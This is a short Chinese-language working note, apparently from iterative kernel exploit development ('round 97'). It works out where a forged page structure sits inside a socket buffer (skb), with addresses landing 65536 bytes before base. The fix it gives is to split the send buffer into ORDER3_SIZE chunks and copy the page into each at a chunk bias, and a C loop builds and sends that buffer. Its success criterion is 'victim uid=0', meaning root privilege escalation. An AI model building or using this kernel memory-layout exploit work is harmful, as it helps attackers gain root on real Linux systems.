# 43499 · 页面在 skb 内的**几何**：还缺两个数（round 97）

## 推导（从 `d = -65536` 出发）

```
页面内容的地址 = payload_base + 槽 = (prepared.base + d) + 槽  ⇒ 落在 base **之前** 65536 字节 ✗
skb 的数据从 base 起 ⇒ 单块 send 覆盖不到它 ✗
⇒ 退役的解法：整块缓冲按 ORDER3_SIZE 分块、每块铺一份页面（p = skb_buf() + chunk + chunk_bias）
   ⇒ 总有一块的页面正好落在 base + d 处 ✓（由 chunk_bias 对齐）
```

## 缺的两个数（退役里是 `memory::` 常量 ✗ ⇒ 按本树规矩落成 wire 键 ✓）

| 名字（建议键） | 含义 | 退役常量 |
| --- | --- | --- |
| `…payload.order3_size` | 分块粒度 | `memory::ORDER3_SIZE` |
| `…payload.chunk_bias` | 块内偏移（页面在该块中的位置） | `memory::SKB_FRAG_BIAS` |

⇒ 取到这两个数后，发送缓冲的构造与退役逐行同形：

```c
for (chunk = 0; chunk < send_size; chunk += order3) {
    p = buffer + chunk + chunk_bias;
    …把页面写进 p（指针一律用 payload_base = prepared.base + d 算）…
}
send_bytes(fd, buffer, send_size);
```

## 判据

- `TEMPBISECT at2000`（若把写目标仍指向自家缓冲 ✓）或直接 **`victim uid=0`** ✓。
